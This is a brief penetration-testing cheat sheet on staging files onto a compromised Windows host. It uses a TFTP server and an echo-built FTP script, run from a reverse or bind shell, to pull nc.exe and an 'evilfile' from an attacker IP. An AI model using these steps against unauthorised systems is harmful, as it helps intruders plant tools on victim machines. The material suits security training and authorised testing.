### File Transfers
#### TFTP UDP Transfer
```
# Create directory to serve files
mkdir /tftp

# Start atftpd daemon and listen on UDP port 69 using /tftp as root
atftpd --daemon --port 69 /tftp

# Copy file to share to host directory
cp /usr/share/windows-binaries/nc.exe /tftp/

# In your reverse/bind shell on the target machine, change 10.11.1.140 to attacking ip
tftp -i 10.11.1.140 GET nc.exe
```
#### FTP File Transfer
On attacking machine, setup an ftp server
`apt-get install pure-ftpd`

Download and run the following setup file, it will create an ftp user 'bedford'
[setup-ftp](/setup-ftp)

Change user permissions, run file and set password on request
`chmod 755`
`./setup-ftp`

Copy and paste the following code into your Windows target bind/reverse shell
```echo open *ATTACKINGIP* 21> ftp.txt
echo user bedford>> ftp.txt
echo *PASSWORD*>> ftp.txt
echo bin>> ftp.txt
echo GET evilfile.txt>> ftp.txt
echo bye>> ftp.txt```

Now in your Windows bind/reverse shell run the ftp.txt file
`ftp -v -n -s:ftp.txt`


